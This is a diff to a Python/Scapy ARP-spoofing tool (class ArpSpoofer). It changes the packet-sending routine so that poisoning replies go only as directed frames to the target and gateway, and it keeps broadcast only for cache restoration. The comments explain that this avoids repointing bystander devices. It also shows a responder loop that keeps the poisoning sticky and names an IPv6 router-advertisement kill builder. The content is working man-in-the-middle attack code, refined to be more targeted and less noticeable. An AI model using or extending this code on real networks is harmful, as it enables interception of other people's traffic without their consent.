@@ -117,8 +117,8 @@ class ArpSpoofer:
         if responder:
             responder.join(timeout=1)
         for _ in range(3):
-            self._send_arp(self.env.gateway_ip, self.env.gateway_mac, self.env.target_ip, "ff:ff:ff:ff:ff:ff")
-            self._send_arp(self.env.target_ip, self.env.target_mac, self.env.gateway_ip, "ff:ff:ff:ff:ff:ff")
+            self._send_arp(self.env.gateway_ip, self.env.gateway_mac, self.env.target_ip, "ff:ff:ff:ff:ff:ff", broadcast=True)
+            self._send_arp(self.env.target_ip, self.env.target_mac, self.env.gateway_ip, "ff:ff:ff:ff:ff:ff", broadcast=True)
 
     def _respond_loop(self):
         """Answer ARP who-has for the gateway/target instantly.
@@ -157,13 +157,18 @@ class ArpSpoofer:
         self._send_arp(self.env.gateway_ip, self.our_mac, self.env.target_ip, self.env.target_mac)
         self._send_arp(self.env.target_ip, self.our_mac, self.env.gateway_ip, self.env.gateway_mac)
 
-    def _send_arp(self, psrc: str, hwsrc: str, pdst: str, hwdst: str):
+    def _send_arp(self, psrc: str, hwsrc: str, pdst: str, hwdst: str, broadcast: bool = False):
         pkt = ARP(op=2, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst)
-        # Send both directed and broadcast replies. Some stacks ignore unsolicited
-        # unicast updates unless an entry already exists; broadcast keeps lab
-        # namespaces and consumer devices behaving consistently.
+        # Poison updates go out directed ONLY: a broadcast gratuitous reply is
+        # processed by every stack on the LAN, so it repoints the gateway entry
+        # of bystander devices too and hairpins their traffic through us.
+        # Stickiness against neighbor flushes is handled by the responder, which
+        # answers the target's own who-has requests deterministically.
+        # broadcast=True is used solely for restore(), where healing bystander
+        # caches is exactly what we want.
         sendp(Ether(src=hwsrc, dst=hwdst) / pkt, iface=self.env.iface, verbose=False)
-        sendp(Ether(src=hwsrc, dst="ff:ff:ff:ff:ff:ff") / pkt, iface=self.env.iface, verbose=False)
+        if broadcast:
+            sendp(Ether(src=hwsrc, dst="ff:ff:ff:ff:ff:ff") / pkt, iface=self.env.iface, verbose=False)
 
 
 def build_ra_kill(router_ll: str, router_mac: str, prefixes: list[tuple[str, int]] | None = None):
